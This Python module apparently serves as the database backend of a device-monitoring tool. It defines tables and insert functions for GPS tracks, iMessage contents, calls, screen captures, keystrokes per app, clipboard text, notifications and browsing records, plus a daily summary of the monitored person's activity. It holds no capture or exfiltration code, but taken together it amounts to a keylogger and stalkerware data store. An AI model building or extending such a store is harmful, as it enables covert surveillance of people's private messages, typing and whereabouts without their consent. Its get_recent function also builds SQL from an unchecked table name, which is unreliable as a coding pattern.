import sqlite3
import json
from datetime import datetime
from pathlib import Path

DB_PATH = Path(__file__).parent / "monitor.db"

def get_conn():
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    return conn

def init_db():
    conn = get_conn()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            latitude REAL NOT NULL,
            longitude REAL NOT NULL,
            altitude REAL DEFAULT 0,
            speed REAL DEFAULT 0,
            accuracy REAL DEFAULT 0,
            timestamp DATETIME DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            text TEXT,
            sender TEXT,
            recipient TEXT,
            is_from_me INTEGER DEFAULT 0,
            service TEXT DEFAULT 'iMessage',
            timestamp DATETIME
        );
        CREATE TABLE IF NOT EXISTS calls (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            caller_id TEXT,
            duration INTEGER DEFAULT 0,
            call_type TEXT,
            timestamp DATETIME DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS screen_captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            image_path TEXT,
            timestamp DATETIME DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS app_usage (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            app_name TEXT,
            bundle_id TEXT,
            duration INTEGER DEFAULT 0,
            timestamp DATETIME DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS network_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            method TEXT,
            host TEXT,
            bytes_sent INTEGER DEFAULT 0,
            bytes_received INTEGER DEFAULT 0,
            timestamp DATETIME DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            text TEXT,
            app_name TEXT,
            timestamp DATETIME DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS clipboard_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            text TEXT,
            app_name TEXT,
            timestamp DATETIME DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS notifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            app_name TEXT,
            title TEXT,
            body TEXT,
            timestamp DATETIME DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS device_status (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            battery_level REAL,
            is_charging INTEGER DEFAULT 0,
            wifi_ssid TEXT,
            signal_strength INTEGER DEFAULT 0,
            timestamp DATETIME DEFAULT (datetime('now'))
        );
        CREATE INDEX IF NOT EXISTS idx_messages_ts ON messages(timestamp);
        CREATE INDEX IF NOT EXISTS idx_locations_ts ON locations(timestamp);
        CREATE INDEX IF NOT EXISTS idx_captures_ts ON screen_captures(timestamp);
    """)
    conn.commit()
    conn.close()

def insert_location(lat, lon, altitude=0, speed=0, accuracy=0):
    conn = get_conn()
    conn.execute("INSERT INTO locations (latitude, longitude, altitude, speed, accuracy) VALUES (?, ?, ?, ?, ?)",
                 (lat, lon, altitude, speed, accuracy))
    conn.commit()
    conn.close()

def insert_message(text, sender, recipient, is_from_me, service, timestamp):
    conn = get_conn()
    conn.execute("INSERT INTO messages (text, sender, recipient, is_from_me, service, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                 (text, sender, recipient, is_from_me, service, timestamp))
    conn.commit()
    conn.close()

def insert_call(caller_id, duration, call_type):
    conn = get_conn()
    conn.execute("INSERT INTO calls (caller_id, duration, call_type) VALUES (?, ?, ?)",
                 (caller_id, duration, call_type))
    conn.commit()
    conn.close()

def insert_screen_capture(image_path):
    conn = get_conn()
    conn.execute("INSERT INTO screen_captures (image_path) VALUES (?)", (image_path,))
    conn.commit()
    conn.close()

def insert_app_usage(app_name, bundle_id, duration):
    conn = get_conn()
    conn.execute("INSERT INTO app_usage (app_name, bundle_id, duration) VALUES (?, ?, ?)",
                 (app_name, bundle_id, duration))
    conn.commit()
    conn.close()

def insert_network_log(url, method, host, sent, received):
    conn = get_conn()
    conn.execute("INSERT INTO network_log (url, method, host, bytes_sent, bytes_received) VALUES (?, ?, ?, ?, ?)",
                 (url, method, host, sent, received))
    conn.commit()
    conn.close()

def insert_keystroke(text, app_name):
    conn = get_conn()
    conn.execute("INSERT INTO keystrokes (text, app_name) VALUES (?, ?)", (text, app_name))
    conn.commit()
    conn.close()

def insert_clipboard(text, app_name):
    conn = get_conn()
    conn.execute("INSERT INTO clipboard_log (text, app_name) VALUES (?, ?)", (text, app_name))
    conn.commit()
    conn.close()

def insert_notification(app_name, title, body):
    conn = get_conn()
    conn.execute("INSERT INTO notifications (app_name, title, body) VALUES (?, ?, ?)",
                 (app_name, title, body))
    conn.commit()
    conn.close()

def insert_device_status(battery, charging, wifi, signal):
    conn = get_conn()
    conn.execute("INSERT INTO device_status (battery_level, is_charging, wifi_ssid, signal_strength) VALUES (?, ?, ?, ?)",
                 (battery, charging, wifi, signal))
    conn.commit()
    conn.close()

def get_recent(table, limit=50):
    conn = get_conn()
    rows = conn.execute(f"SELECT * FROM {table} ORDER BY timestamp DESC LIMIT ?", (limit,)).fetchall()
    conn.close()
    return [dict(r) for r in rows]

def get_today_summary():
    conn = get_conn()
    today = datetime.now().strftime("%Y-%m-%d")
    data = {}
    data["messages_count"] = conn.execute("SELECT COUNT(*) FROM messages WHERE date(timestamp)=?", (today,)).fetchone()[0]
    data["calls_count"] = conn.execute("SELECT COUNT(*) FROM calls WHERE date(timestamp)=?", (today,)).fetchone()[0]
    data["locations_count"] = conn.execute("SELECT COUNT(*) FROM locations WHERE date(timestamp)=?", (today,)).fetchone()[0]
    data["captures_count"] = conn.execute("SELECT COUNT(*) FROM screen_captures WHERE date(timestamp)=?", (today,)).fetchone()[0]
    data["apps_used"] = conn.execute("SELECT COUNT(DISTINCT app_name) FROM app_usage WHERE date(timestamp)=?", (today,)).fetchone()[0]
    data["keystrokes_count"] = conn.execute("SELECT COUNT(*) FROM keystrokes WHERE date(timestamp)=?", (today,)).fetchone()[0]
    data["network_requests"] = conn.execute("SELECT COUNT(*) FROM network_log WHERE date(timestamp)=?", (today,)).fetchone()[0]
    data["latest_location"] = conn.execute("SELECT latitude, longitude FROM locations ORDER BY timestamp DESC LIMIT 1").fetchone()
    conn.close()
    return data
